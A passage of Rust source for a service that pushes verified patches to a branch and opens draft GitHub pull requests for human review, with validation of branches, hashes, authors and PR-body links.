                self.record_github_failure(&error).await?;
                return Err(error.into());
            }
        };
        if existing.len() > 1 {
            return Err(PublisherError::MultiplePullRequests(input.branch.clone()));
        }
        if let Some(pull) = existing.first() {
            let outcome = self.validate_existing_pull(input, &token, pull)?;
            self.ensure_bare_repository(&token, &input.base_sha, cancellation)
                .await?;
            self.validate_existing_branch(input, &token, &pull.head.sha, cancellation)
                .await?;
            self.complete_recovered_effects(input, pull).await?;
            self.record_open_pull(input, pull).await?;
            return Ok(outcome);
        }
        let snapshot = match self
            .github
            .open_pull_requests(
                &token,
                &self.config.repository,
                self.config.max_open_prs + 1,
                cancellation,
            )
            .await
        {
            Ok(snapshot) => snapshot,
            Err(error) => {
                self.record_github_failure(&error).await?;
                return Err(error.into());
            }
        };
        let age = OffsetDateTime::now_utc() - snapshot.observed_at;
        if age.is_negative()
            || age
                > time::Duration::try_from(self.config.github_freshness)
                    .map_err(|_| PublisherError::InvalidConfig("GitHub freshness"))?
        {
            let error = PublisherError::StaleGitHubState;
            self.store
                .record_github_failure(&self.config.repository.full_name(), &error.to_string())
                .await?;
            return Err(error);
        }
        self.store
            .record_github_success(
                &self.config.repository.full_name(),
                snapshot.observed_at,
                snapshot.pull_requests.len(),
            )
            .await?;
        if snapshot.pull_requests.len() >= self.config.max_open_prs {
            return Err(PublisherError::OpenPullRequestCap {
                count: snapshot.pull_requests.len(),
            });
        }

        self.ensure_bare_repository(&token, &input.base_sha, cancellation)
            .await?;
        let push_key = format!("publisher:{}:branch-push", input.run_id);
        let disposition = self
            .store
            .begin_publication_effect(
                input.request_id,
                input.run_id,
                &push_key,
                "github-branch-push",
            )
            .await?;
        let head_sha = match self
            .remote_branch_head(&token, &input.branch, cancellation)
            .await?
        {
            Some(head_sha) => {
                self.validate_existing_branch(input, &token, &head_sha, cancellation)
                    .await?;
                head_sha
            }
            None => {
                if disposition == SideEffectDisposition::Completed {
                    return Err(PublisherError::MissingCompletedBranch);
                }
                let head_sha = self
                    .prepare_commit(input, patch_path, &token, cancellation)
                    .await?;
                if self.config.fault_after == Some(CrashPoint::BeforeBranchPush) {
                    return Err(PublisherError::InjectedCrash(CrashPoint::BeforeBranchPush));
                }
                self.push_branch(&token, &input.branch, &head_sha, cancellation)
                    .await?;
                if self.config.fault_after == Some(CrashPoint::AfterBranchPush) {
                    return Err(PublisherError::InjectedCrash(CrashPoint::AfterBranchPush));
                }
                head_sha
            }
        };
        self.store
            .finish_publication_effect(
                &push_key,
                "completed",
                Some(&head_sha),
                serde_json::json!({
                    "branch": input.branch,
                    "head_sha": head_sha,
                    "tree_hash": input.expected_tree_hash,
                }),
            )
            .await?;
        self.store
            .transition_publication(
                input.request_id,
                input.run_id,
                "publisher.branch_pushed",
                "publishing",
                &format!("publisher:{}:branch-pushed", input.run_id),
                serde_json::json!({"branch": input.branch, "head_sha": head_sha}),
            )
            .await?;

        let pr_key = format!("publisher:{}:draft-pr", input.run_id);
        let pr_disposition = self
            .store
            .begin_publication_effect(input.request_id, input.run_id, &pr_key, "github-draft-pr")
            .await?;
        let existing = self
            .github
            .pull_requests_for_branch(&token, &self.config.repository, &input.branch, cancellation)
            .await?;
        if existing.len() > 1 {
            return Err(PublisherError::MultiplePullRequests(input.branch.clone()));
        }
        let pull = if let Some(pull) = existing.into_iter().next() {
            pull
        } else {
            if pr_disposition == SideEffectDisposition::Completed {
                return Err(PublisherError::MissingCompletedPullRequest);
            }
            self.github
                .create_draft_pull_request(
                    &token,
                    &self.config.repository,
                    &CreatePullRequest {
                        title: input.title.clone(),
                        head: input.branch.clone(),
                        base: self.config.base_branch.clone(),
                        body: input.body.clone(),
                        draft: true,
                    },
                    cancellation,
                )
                .await?
        };
        let outcome = self.validate_existing_pull(input, &token, &pull)?;
        if pull.head.sha != head_sha {
            return Err(PublisherError::PullRequestHeadMismatch {
                expected: head_sha,
                actual: pull.head.sha,
            });
        }
        self.store
            .finish_publication_effect(
                &pr_key,
                "completed",
                Some(&pull.number.to_string()),
                serde_json::json!({"number": pull.number, "url": pull.html_url}),
            )
            .await?;
        self.store
            .transition_publication(
                input.request_id,
                input.run_id,
                "publisher.draft_pr_opened",
                "publishing",
                &format!("publisher:{}:draft-pr-opened", input.run_id),
                serde_json::json!({
                    "number": pull.number,
                    "branch": input.branch,
                    "head_sha": pull.head.sha,
                    "author_login": pull.user.login,
                }),
            )
            .await?;
        self.record_open_pull(input, &pull).await?;
        Ok(outcome)
    }

    async fn complete_recovered_effects(
        &self,
        input: &PublishInput,
        pull: &PullRequest,
    ) -> Result<(), PublisherError> {
        let push_key = format!("publisher:{}:branch-push", input.run_id);
        self.store
            .begin_publication_effect(
                input.request_id,
                input.run_id,
                &push_key,
                "github-branch-push",
            )
            .await?;
        self.store
            .finish_publication_effect(
                &push_key,
                "completed",
                Some(&pull.head.sha),
                serde_json::json!({
                    "branch": input.branch,
                    "head_sha": pull.head.sha,
                    "tree_hash": input.expected_tree_hash,
                    "recovered_from_github": true,
                }),
            )
            .await?;
        self.store
            .transition_publication(
                input.request_id,
                input.run_id,
                "publisher.branch_pushed",
                "publishing",
                &format!("publisher:{}:branch-pushed", input.run_id),
                serde_json::json!({
                    "branch": input.branch,
                    "head_sha": pull.head.sha,
                    "recovered_from_github": true,
                }),
            )
            .await?;

        let pr_key = format!("publisher:{}:draft-pr", input.run_id);
        self.store
            .begin_publication_effect(input.request_id, input.run_id, &pr_key, "github-draft-pr")
            .await?;
        self.store
            .finish_publication_effect(
                &pr_key,
                "completed",
                Some(&pull.number.to_string()),
                serde_json::json!({
                    "number": pull.number,
                    "url": pull.html_url,
                    "recovered_from_github": true,
                }),
            )
            .await?;
        self.store
            .transition_publication(
                input.request_id,
                input.run_id,
                "publisher.draft_pr_opened",
                "publishing",
                &format!("publisher:{}:draft-pr-opened", input.run_id),
                serde_json::json!({
                    "number": pull.number,
                    "branch": input.branch,
                    "head_sha": pull.head.sha,
                    "author_login": pull.user.login,
                    "recovered_from_github": true,
                }),
            )
            .await?;
        Ok(())
    }

    fn validate_existing_pull(
        &self,
        input: &PublishInput,
        token: &InstallationToken,
        pull: &PullRequest,
    ) -> Result<PublishedPullRequest, PublisherError> {
        if pull.state != "open" {
            return Err(PublisherError::ExistingPullRequestClosed(pull.number));
        }
        if !pull.draft {
            return Err(PublisherError::PullRequestNotDraft(pull.number));
        }
        if pull.head.branch != input.branch || pull.base.branch != self.config.base_branch {
            return Err(PublisherError::PullRequestBranchMismatch(pull.number));
        }
        if pull.user.login != token.bot.login {
            return Err(PublisherError::PullRequestAuthor {
                expected: token.bot.login.clone(),
                actual: pull.user.login.clone(),
            });
        }
        validate_git_sha("pull request head", &pull.head.sha)?;
        Ok(PublishedPullRequest {
            number: pull.number,
            url: pull.html_url.clone(),
            branch: pull.head.branch.clone(),
            head_sha: pull.head.sha.clone(),
            author_login: pull.user.login.clone(),
        })
    }

    async fn record_open_pull(
        &self,
        input: &PublishInput,
        pull: &PullRequest,
    ) -> Result<(), PublisherError> {
        self.store
            .upsert_pull_request(&PullRequestRecord {
                number: pull.number,
                request_id: input.request_id,
                run_id: input.run_id,
                branch: pull.head.branch.clone(),
                head_sha: pull.head.sha.clone(),
                ci_state: "unknown".to_owned(),
                review_state: "pending".to_owned(),
                state: pull.state.clone(),
                is_draft: pull.draft,
                author_login: pull.user.login.clone(),
                html_url: pull.html_url.clone(),
                github_updated_at: pull.updated_at()?,
                merged_at: None,
                merge_commit_sha: None,
                merged_by: None,
                deployed_sha: None,
                admin_bypassed: false,
                passing_run: false,
                reconcile_error: None,
            })
            .await?;
        Ok(())
    }

    async fn record_github_failure(&self, error: &GitHubError) -> Result<(), PublisherError> {
        self.store
            .record_github_failure(&self.config.repository.full_name(), &error.to_string())
            .await?;
        Ok(())
    }

    async fn ensure_bare_repository(
        &self,
        token: &InstallationToken,
        base_sha: &str,
        cancellation: &CancellationToken,
    ) -> Result<(), PublisherError> {
        let root = self.config.worktree_root.clone();
        tokio::task::spawn_blocking(move || {
            std::fs::create_dir_all(&root)?;
            let metadata = std::fs::symlink_metadata(&root)?;
            if !metadata.is_dir() || metadata.file_type().is_symlink() {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::InvalidInput,
                    "publisher worktree root is not a regular directory",
                ));
            }
            std::fs::set_permissions(root, std::fs::Permissions::from_mode(0o750))
        })
        .await
        .map_err(PublisherError::Join)??;
        let repository = self.repository_path();
        let remote = self.remote_url();
        if !tokio::fs::try_exists(&repository).await? {
            let clone = self
                .git(
                    token,
                    vec![
                        OsString::from("clone"),
                        OsString::from("--bare"),
                        OsString::from("--no-tags"),
                        OsString::from(&remote),
                        repository.as_os_str().to_owned(),
                    ],
                    None,
                    cancellation,
                )
                .await;
            match clone {
                Ok(output) if output.code == 0 => {}
                Ok(output) => {
                    self.cleanup_partial_bare(&repository).await?;
                    return Err(PublisherError::Git {
                        operation: "bare clone",
                        code: output.code,
                    });
                }
                Err(error) => {
                    self.cleanup_partial_bare(&repository).await?;
                    return Err(error);
                }
            }
        }
        let bare = self
            .git_text(
                token,
                vec![
                    OsString::from("-C"),
                    repository.as_os_str().to_owned(),
                    OsString::from("rev-parse"),
                    OsString::from("--is-bare-repository"),
                ],
                None,
                cancellation,
            )
            .await?;
        if bare.trim() != "true" {
            return Err(PublisherError::UnsafeBareRepository(repository));
        }
        let actual_remote = self
            .git_text(
                token,
                vec![
                    OsString::from("-C"),
                    repository.as_os_str().to_owned(),
                    OsString::from("remote"),
                    OsString::from("get-url"),
                    OsString::from("origin"),
                ],
                None,
                cancellation,
            )
            .await?;
        if actual_remote.trim() != remote {
            return Err(PublisherError::UnsafeRemote {
                expected: remote,
                actual: actual_remote.trim().to_owned(),
            });
        }
        let output = self
            .git(
                token,
                vec![
                    OsString::from("-C"),
                    repository.as_os_str().to_owned(),
                    OsString::from("fetch"),
                    OsString::from("--prune"),
                    OsString::from("--no-tags"),
                    OsString::from("origin"),
                    OsString::from(format!(
                        "+refs/heads/{}:refs/remotes/origin/{}",
                        self.config.base_branch, self.config.base_branch
                    )),
                ],
                None,
                cancellation,
            )
            .await?;
        require_git_success("fetch base", &output)?;
        let output = self
            .git(
                token,
                vec![
                    OsString::from("-C"),
                    repository.as_os_str().to_owned(),
                    OsString::from("cat-file"),
                    OsString::from("-e"),
                    OsString::from(format!("{base_sha}^{{commit}}")),
                ],
                None,
                cancellation,
            )
            .await?;
        require_git_success("locate recorded base", &output)?;
        Ok(())
    }

    fn remote_url(&self) -> String {
        #[cfg(test)]
        if let Some(remote) = &self.config.test_remote {
            return remote.clone();
        }
        format!(
            "https://github.com/{}.git",
            self.config.repository.full_name()
        )
    }

    async fn cleanup_partial_bare(&self, repository: &Path) -> Result<(), PublisherError> {
        if !tokio::fs::try_exists(repository).await? {
            return Ok(());
        }
        let path = repository.to_path_buf();
        tokio::task::spawn_blocking(move || std::fs::remove_dir_all(path))
            .await
            .map_err(PublisherError::Join)??;
        Ok(())
    }

    async fn remote_branch_head(
        &self,
        token: &InstallationToken,
        branch: &str,
        cancellation: &CancellationToken,
    ) -> Result<Option<String>, PublisherError> {
        let repository = self.repository_path();
        let output = self
            .git_text(
                token,
                vec![
                    OsString::from("-C"),
                    repository.as_os_str().to_owned(),
                    OsString::from("ls-remote"),
                    OsString::from("--heads"),
                    OsString::from("origin"),
                    OsString::from(format!("refs/heads/{branch}")),
                ],
                None,
                cancellation,
            )
            .await?;
        if output.trim().is_empty() {
            return Ok(None);
        }
        let lines: Vec<_> = output.lines().collect();
        if lines.len() != 1 {
            return Err(PublisherError::MalformedGitOutput("ls-remote"));
        }
        let mut fields = lines[0].split('\t');
        let sha = fields
            .next()
            .ok_or(PublisherError::MalformedGitOutput("ls-remote"))?;
        let reference = fields
            .next()
            .ok_or(PublisherError::MalformedGitOutput("ls-remote"))?;
        if fields.next().is_some() || reference != format!("refs/heads/{branch}") {
            return Err(PublisherError::MalformedGitOutput("ls-remote"));
        }
        validate_git_sha("remote branch head", sha)?;
        Ok(Some(sha.to_owned()))
    }

    async fn validate_existing_branch(
        &self,
        input: &PublishInput,
        token: &InstallationToken,
        head_sha: &str,
        cancellation: &CancellationToken,
    ) -> Result<(), PublisherError> {
        if !branch_belongs_to_request(&input.branch, input.request_id) {
            return Err(PublisherError::ForeignBranch(input.branch.clone()));
        }
        let repository = self.repository_path();
        let output = self
            .git(
                token,
                vec![
                    OsString::from("-C"),
                    repository.as_os_str().to_owned(),
                    OsString::from("fetch"),
                    OsString::from("--no-tags"),
                    OsString::from("origin"),
                    OsString::from(format!(
                        "+refs/heads/{}:refs/remotes/origin/{}",
                        input.branch, input.branch
                    )),
                ],
                None,
                cancellation,
            )
            .await?;
        require_git_success("fetch existing factory branch", &output)?;
        let parent = self
            .git_text(
                token,
                vec![
                    OsString::from("-C"),
                    repository.as_os_str().to_owned(),
                    OsString::from("rev-parse"),
                    OsString::from(format!("{head_sha}^")),
                ],
                None,
                cancellation,
            )
            .await?;
        if parent.trim() != input.base_sha {
            return Err(PublisherError::ExistingBranchParent {
                expected: input.base_sha.clone(),
                actual: parent.trim().to_owned(),
            });
        }
        let email = self
            .git_text(
                token,
                vec![
                    OsString::from("-C"),
                    repository.as_os_str().to_owned(),
                    OsString::from("show"),
                    OsString::from("-s"),
                    OsString::from("--format=%ae"),
                    OsString::from(head_sha),
                ],
                None,
                cancellation,
            )
            .await?;
        if email.trim() != token.bot.email() {
            return Err(PublisherError::ExistingBranchAuthor(
                email.trim().to_owned(),
            ));
        }
        let hash = hash_commit_tree(
            &repository,
            head_sha,
            &self.config.worktree_root.join("validate"),
            cancellation,
        )
        .await?;
        if hash != input.expected_tree_hash {
            return Err(PublisherError::TreeHashMismatch {
                expected: input.expected_tree_hash.clone(),
                actual: hash,
            });
        }
        Ok(())
    }

    async fn prepare_commit(
        &self,
        input: &PublishInput,
        patch_path: &Path,
        token: &InstallationToken,
        cancellation: &CancellationToken,
    ) -> Result<String, PublisherError> {
        let repository = self.repository_path();
        let name = format!("publish-{}", input.run_id.simple());
        let path = self.config.worktree_root.join(&name);
        if tokio::fs::try_exists(&path).await? {
            let mut cleanup = ProcessSpec::new(&self.config.git_program);
            cleanup.args = vec![
                OsString::from("-C"),
                repository.as_os_str().to_owned(),
                OsString::from("worktree"),
                OsString::from("remove"),
                OsString::from("--force"),
                path.as_os_str().to_owned(),
            ];
            cleanup.timeout = Duration::from_secs(60);
            cleanup.output_limit = 128 * 1024;
            let output = run_bounded(&cleanup, &CancellationToken::new()).await?;
            require_git_success("remove recovered publisher worktree", &output)?;
        }
        let worktree = DetachedWorktree::create(
            &repository,
            &input.base_sha,
            &self.config.worktree_root,
            &name,
            cancellation,
        )
        .await?;
        let result = async {
            let mut apply = ProcessSpec::new(&self.config.git_program);
            apply.args = vec![
                OsString::from("-C"),
                worktree.path().as_os_str().to_owned(),
                OsString::from("apply"),
                OsString::from("--index"),
                patch_path.as_os_str().to_owned(),
            ];
            apply.timeout = Duration::from_secs(60);
            apply.output_limit = 256 * 1024;
            let output = run_bounded(&apply, cancellation).await?;
            require_git_success("apply verified patch", &output)?;
            let tree_root = worktree.path().to_path_buf();
            let actual = tokio::task::spawn_blocking(move || tree_hash(&tree_root))
                .await
                .map_err(PublisherError::Join)??;
            if actual != input.expected_tree_hash {
                return Err(PublisherError::TreeHashMismatch {
                    expected: input.expected_tree_hash.clone(),
                    actual,
                });
            }
            let mut commit = ProcessSpec::new(&self.config.git_program);
            commit.args = vec![
                OsString::from("-C"),
                worktree.path().as_os_str().to_owned(),
                OsString::from("-c"),
                OsString::from(format!("user.name={}", token.bot.login)),
                OsString::from("-c"),
                OsString::from(format!("user.email={}", token.bot.email())),
                OsString::from("commit"),
                OsString::from("--no-gpg-sign"),
                OsString::from("-m"),
                OsString::from(format!("Factory request {}", input.request_id)),
            ];
            commit.timeout = Duration::from_secs(60);
            commit.output_limit = 256 * 1024;
            let output = run_bounded(&commit, cancellation).await?;
            require_git_success("commit verified patch", &output)?;
            let head = self
                .git_text(
                    token,
                    vec![
                        OsString::from("-C"),
                        worktree.path().as_os_str().to_owned(),
                        OsString::from("rev-parse"),
                        OsString::from("HEAD"),
                    ],
                    None,
                    cancellation,
                )
                .await?;
            validate_git_sha("publisher head", head.trim())?;
            Ok(head.trim().to_owned())
        }
        .await;
        let close = worktree.close(&CancellationToken::new()).await;
        match (result, close) {
            (Ok(head), Ok(())) => Ok(head),
            (Err(error), Ok(())) => Err(error),
            (_, Err(error)) => Err(error.into()),
        }
    }

    async fn push_branch(
        &self,
        token: &InstallationToken,
        branch: &str,
        head_sha: &str,
        cancellation: &CancellationToken,
    ) -> Result<(), PublisherError> {
        let repository = self.repository_path();
        validate_git_sha("publisher head", head_sha)?;
        let output = self
            .git(
                token,
                vec![
                    OsString::from("-C"),
                    repository.as_os_str().to_owned(),
                    OsString::from("push"),
                    OsString::from("origin"),
                    OsString::from(format!("{head_sha}:refs/heads/{branch}")),
                ],
                None,
                cancellation,
            )
            .await?;
        require_git_success("push factory branch", &output)
    }

    async fn git_text(
        &self,
        token: &InstallationToken,
        arguments: Vec<OsString>,
        current_dir: Option<PathBuf>,
        cancellation: &CancellationToken,
    ) -> Result<String, PublisherError> {
        let output = self
            .git(token, arguments, current_dir, cancellation)
            .await?;
        require_git_success("inspect Git state", &output)?;
        String::from_utf8(output.stdout).map_err(|_| PublisherError::NonUtf8Git)
    }

    async fn git(
        &self,
        token: &InstallationToken,
        arguments: Vec<OsString>,
        current_dir: Option<PathBuf>,
        cancellation: &CancellationToken,
    ) -> Result<crate::process::ProcessOutput, PublisherError> {
        let mut spec = ProcessSpec::new(&self.config.git_program);
        spec.args = arguments;
        spec.current_dir = current_dir;
        spec.environment = vec![
            (
                OsString::from("PATCHYARD_GITHUB_TOKEN"),
                OsString::from(token.expose()),
            ),
            (
                OsString::from("GIT_ASKPASS"),
                self.config.git_askpass.as_os_str().to_owned(),
            ),
            (OsString::from("GIT_TERMINAL_PROMPT"), OsString::from("0")),
        ];
        spec.timeout = Duration::from_secs(120);
        spec.output_limit = MAX_GITHUB_OUTPUT;
        Ok(run_bounded(&spec, cancellation).await?)
    }
}

impl<S: PublicationStore + PublisherStore> PublishService for Publisher<S> {
    fn publish<'a>(
        &'a self,
        input: &'a PublishInput,
        patch_path: &'a Path,
        cancellation: &'a CancellationToken,
    ) -> PublisherFuture<'a> {
        Box::pin(Publisher::publish(self, input, patch_path, cancellation))
    }
}

#[derive(Clone, Debug, Serialize)]
#[serde(deny_unknown_fields)]
pub struct CreatePullRequest {
    title: String,
    head: String,
    base: String,
    body: String,
    draft: bool,
}

#[derive(Clone, Debug, Eq, PartialEq)]
pub struct EvidenceLink {
    pub label: String,
    pub run_id: Uuid,
    pub name: String,
    pub sha256: String,
}

pub fn build_initial_pr_body(
    request_id: Uuid,
    contract: &ReviewContract,
    base_sha: &str,
    expected_tree_hash: &str,
    patch_sha256: &str,
) -> Result<String, PublisherError> {
    contract.validate()?;
    validate_git_sha("base SHA", base_sha)?;
    validate_sha256("tree hash", expected_tree_hash)?;
    validate_sha256("patch digest", patch_sha256)?;
    let request_data = format!(
        "Source label: {}\n\nRequest body:\n{}",
        contract.request_source, contract.verbatim_request
    );
    let fence = code_fence(&request_data);
    let body = render_contract(
        request_id,
        contract,
        base_sha,
        expected_tree_hash,
        patch_sha256,
        &fence,
        &request_data,
        "GitHub CI and isolated browser evidence are pending. This draft must not be reviewed yet.",
        None,
    );
    validate_pr_body(&body)?;
    Ok(body)
}

#[allow(clippy::too_many_arguments)]
pub fn build_final_pr_body(
    request_id: Uuid,
    contract: &ReviewContract,
    base_sha: &str,
    head_sha: &str,
    expected_tree_hash: &str,
    patch_sha256: &str,
    evidence: &[EvidenceLink],
) -> Result<String, PublisherError> {
    contract.validate()?;
    validate_git_sha("base SHA", base_sha)?;
    validate_git_sha("head SHA", head_sha)?;
    validate_sha256("tree hash", expected_tree_hash)?;
    validate_sha256("patch digest", patch_sha256)?;
    if evidence.len() < 4 || evidence.len() > 16 {
        return Err(PublisherError::InvalidInput("evidence link count"));
    }
    let mut names = std::collections::BTreeSet::new();
    let mut evidence_lines = String::new();
    for item in evidence {
        if !safe_contract_prose(&item.label, 128)
            || !safe_artifact_name(&item.name)
            || !names.insert(item.name.clone())
        {
            return Err(PublisherError::InvalidInput("evidence link"));
        }
        validate_sha256("evidence digest", &item.sha256)?;
        use std::fmt::Write as _;
        writeln!(
            evidence_lines,
            "- [{}](https://factory.example.com/evidence/{}/{}) - SHA-256 `{}`",
            item.label, item.run_id, item.name, item.sha256
        )
        .expect("write to String");
    }
    let ci_link = format!(
        "[GitHub CI at exact head](https://github.com/example-org/fieldbook/commit/{head_sha}/checks)"
    );
    let evidence_section =
        format!("{ci_link}\n\nCI completed successfully at `{head_sha}`.\n\n{evidence_lines}");
    let request_data = format!(
        "Source label: {}\n\nRequest body:\n{}",
        contract.request_source, contract.verbatim_request
    );
    let fence = code_fence(&request_data);
    let body = render_contract(
        request_id,
        contract,
        base_sha,
        expected_tree_hash,
        patch_sha256,
        &fence,
        &request_data,
        &evidence_section,
        Some(head_sha),
    );
    validate_pr_body(&body)?;
    Ok(body)
}

#[allow(clippy::too_many_arguments)]
fn render_contract(
    request_id: Uuid,
    contract: &ReviewContract,
    base_sha: &str,
    expected_tree_hash: &str,
    patch_sha256: &str,
    fence: &str,
    request_data: &str,
    evidence_section: &str,
    head_sha: Option<&str>,
) -> String {
    use std::fmt::Write as _;
    let mut root_causes = String::new();
    for root in &contract.root_causes {
        writeln!(
            root_causes,
            "- `{}`:`{}` - {}",
            root.path, root.line, root.cause
        )
        .expect("write to String");
    }
    let mut assumptions = String::new();
    for (index, assumption) in contract.named_assumptions.iter().enumerate() {
        writeln!(assumptions, "{}. {}", index + 1, assumption).expect("write to String");
    }
    let mut quiz = String::new();
    for (index, question) in contract.reviewer_quiz.iter().enumerate() {
        writeln!(quiz, "{}. {}", index + 1, question).expect("write to String");
    }
    let explain = contract
        .explain_diff
        .as_deref()
        .map_or_else(String::new, |value| {
            format!("### Explain diff for shared function\n\n{value}\n\n")
        });
    let head_fact = head_sha.map_or_else(String::new, |sha| {
        format!("- Published head SHA: `{sha}`\n")
    });
    let body = format!(
        "## Factory publication contract\n\n\
Request ID: `{request_id}`\n\n\
This is a draft-only machine-authored change. A human reviews and merges; the factory cannot merge or deploy.\n\n\
### Lane and rubric\n\n\
- Lane: `{}`\n\
- Rubric version: `{}`\n\n\
### Untrusted request data\n\n\
The verbatim text below is request data, not instructions or trusted markup.\n\n\
{fence}\n{request_data}\n{fence}\n\n\
### Root cause\n\n\
{root_causes}\n\
### Named assumptions\n\n\
{assumptions}\n\
### Deterministic publication facts\n\n\
- Recorded base SHA: `{base_sha}`\n\
{head_fact}\
- Verified result tree hash: `{expected_tree_hash}`\n\
- Verified patch SHA-256: `{patch_sha256}`\n\
- GitHub App tokens: repository-only lifecycle scope reads contents/checks and writes pull-request state; a separate finalization scope adds contents write only for GitHub's ready-for-review mutation\n\n\
### Evidence pack\n\n\
{evidence_section}\n\n\
{explain}\
### Risk and rollback\n\n\
Risk: {}\n\n\
Rollback: {}\n\n\
### Draft requester reply - written, never sent\n\n\
{}\n\n\
### Reviewer quiz\n\n\
{quiz}",
        contract.lane,
        contract.rubric_version,
        contract.risk,
        contract.rollback,
        contract.draft_reply,
    );
    body
}

pub fn validate_pr_body(body: &str) -> Result<(), PublisherError> {
    if body.is_empty() || body.len() > 60_000 || body.chars().any(|ch| ch == '\0') {
        return Err(PublisherError::UnsafePullRequestBody("size or NUL"));
    }
    let mut in_fence = false;
    let mut fence = String::new();
    for line in body.lines() {
        let trimmed = line.trim_start();
        if !in_fence && trimmed.starts_with("```") {
            fence = trimmed
                .chars()
                .take_while(|character| *character == '`')
                .collect();
            in_fence = true;
            continue;
        }
        if in_fence && trimmed == fence {
            in_fence = false;
            fence.clear();
            continue;
        }
        if in_fence {
            continue;
        }
        let Some(without_links) = strip_allowed_markdown_links(trimmed) else {
            return Err(PublisherError::UnsafePullRequestBody(
                "unapproved rendered link",
            ));
        };
        let lower = without_links.to_ascii_lowercase();
        if lower.contains("<img")
            || lower.contains("<image")
            || lower.contains("<a")
            || lower.contains("![")
            || lower.contains("http://")
            || lower.contains("https://")
            || lower.contains("mailto:")
            || lower.contains("www.")
            || lower.contains("](")
        {
            return Err(PublisherError::UnsafePullRequestBody(
                "rendered link or image",
            ));
        }
    }
    if in_fence {
        return Err(PublisherError::UnsafePullRequestBody(
            "unterminated data fence",
        ));
    }
    Ok(())
}

fn strip_allowed_markdown_links(line: &str) -> Option<String> {
    let mut remainder = line;
    let mut clean = String::with_capacity(line.len());
    while let Some(marker) = remainder.find("](") {
        let label_start = remainder[..marker].rfind('[')?;
        clean.push_str(&remainder[..label_start]);
        let target_start = marker + 2;
        let target_end = remainder[target_start..].find(')')? + target_start;
        let label = &remainder[label_start + 1..marker];
        let target = &remainder[target_start..target_end];
        if label.is_empty() || label.contains(['[', ']', '\r', '\n']) || !allowed_pr_link(target) {
            return None;
        }
        clean.push_str(label);
        remainder = &remainder[target_end + 1..];
    }
    clean.push_str(remainder);
    Some(clean)
}

fn allowed_pr_link(target: &str) -> bool {
    if let Some(path) = target.strip_prefix("https://factory.example.com/evidence/") {
        let mut components = path.split('/');
        let run = components.next().unwrap_or_default();
        let name = components.next().unwrap_or_default();
        return components.next().is_none()
            && run.parse::<Uuid>().is_ok()
            && safe_artifact_name(name);
    }
    if let Some(path) =
        target.strip_prefix("https://github.com/example-org/fieldbook/commit/")
    {
        return path
            .strip_suffix("/checks")
            .is_some_and(|sha| sha.len() == 40 && lower_hex(sha));
    }
    false
}

fn safe_artifact_name(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 128
        && !matches!(value, "." | "..")
        && value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'_' | b'-'))
}

fn validate_repo_path(path: &str) -> Result<(), PublisherError> {
    if path.is_empty()
        || path.len() > 512
        || path.starts_with('/')
        || path
            .split('/')
            .any(|part| part.is_empty() || matches!(part, "." | ".."))
        || !path
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'_' | b'/' | b'-'))
    {
        return Err(PublisherError::InvalidInput("root-cause path"));
    }
    Ok(())
}

fn safe_contract_prose(value: &str, maximum: usize) -> bool {
    !value.trim().is_empty()
        && value.len() <= maximum
        && !value.chars().any(char::is_control)
        && !value.contains(['`', '[', ']', '<', '>'])
        && !value.to_ascii_lowercase().contains("http")
        && !value.contains("](")
}

fn lower_hex(value: &str) -> bool {
    value
        .bytes()
        .all(|byte| byte.is_ascii_hexdigit() && !byte.is_ascii_uppercase())
}

pub fn has_head_approval(reviews: &[Review], head_sha: &str) -> bool {
    let mut latest: HashMap<&str, (&Review, OffsetDateTime)> = HashMap::new();
    for review in reviews.iter().filter(|review| review.commit_id == head_sha) {
        let submitted = review
            .submitted_at
            .as_deref()
            .and_then(|value| OffsetDateTime::parse(value, &Rfc3339).ok())
            .unwrap_or(OffsetDateTime::UNIX_EPOCH);
        let entry = latest
            .entry(&review.user.login)
            .or_insert((review, submitted));
        if submitted >= entry.1 {
            *entry = (review, submitted);
        }
    }
    latest
        .values()
        .any(|(review, _)| review.state.eq_ignore_ascii_case("APPROVED"))
}

fn code_fence(value: &str) -> String {
    let maximum = value
        .split(|character| character != '`')
        .map(str::len)
        .max()
        .unwrap_or(0);
    "`".repeat(maximum.saturating_add(1).max(3))
}

fn branch_belongs_to_request(branch: &str, request_id: Uuid) -> bool {
    branch
        .strip_prefix("factory/")
        .and_then(|suffix| suffix.strip_prefix(&request_id.to_string()))
        .is_some_and(|suffix| suffix.starts_with('-'))
}

fn validate_branch(branch: &str) -> Result<(), PublisherError> {
    if branch.is_empty()
        || branch.len() > 240
        || branch.starts_with('/')
        || branch.ends_with('/')
        || branch.contains("..")
        || branch.contains("//")
        || branch.chars().any(|character| {
            !(character.is_ascii_alphanumeric() || matches!(character, '/' | '-' | '_' | '.'))
        })
    {
        return Err(PublisherError::InvalidInput("branch"));
    }
    Ok(())
}

fn validate_title(title: &str) -> Result<(), PublisherError> {
    if title.trim().is_empty()
        || title.len() > 256
        || title.chars().any(char::is_control)
        || title.contains("http://")
        || title.contains("https://")
    {
        return Err(PublisherError::InvalidInput("pull request title"));
    }
    Ok(())
}

fn validate_git_sha(field: &'static str, value: &str) -> Result<(), PublisherError> {
    if value.len() == 40
        && value
            .bytes()
            .all(|byte| byte.is_ascii_hexdigit() && !byte.is_ascii_uppercase())
    {
        Ok(())
    } else {
        Err(PublisherError::InvalidInput(field))
    }
}

fn validate_sha256(field: &'static str, value: &str) -> Result<(), PublisherError> {
    if value.len() == 64
        && value
            .bytes()
            .all(|byte| byte.is_ascii_hexdigit() && !byte.is_ascii_uppercase())
    {
        Ok(())
    } else {
        Err(PublisherError::InvalidInput(field))
    }
}

fn validate_label(field: &'static str, value: &str, maximum: usize) -> Result<(), PublisherError> {
    if value.trim().is_empty() || value.len() > maximum || value.chars().any(char::is_control) {
        Err(PublisherError::InvalidInput(field))
    } else {
        Ok(())
    }
}

fn validate_slug(field: &'static str, value: &str) -> Result<(), PublisherError> {
    if value.is_empty()
        || value.len() > 100
        || !value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_' | b'.'))
    {
        Err(PublisherError::InvalidInput(field))
    } else {
        Ok(())
    }
}

fn validate_slug_github(field: &'static str, value: &str) -> Result<(), GitHubError> {
    if value.is_empty()
        || value.len() > 100
        || !value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || byte == b'-')
    {
        Err(GitHubError::InvalidConfig(field))
    } else {
        Ok(())
    }
}

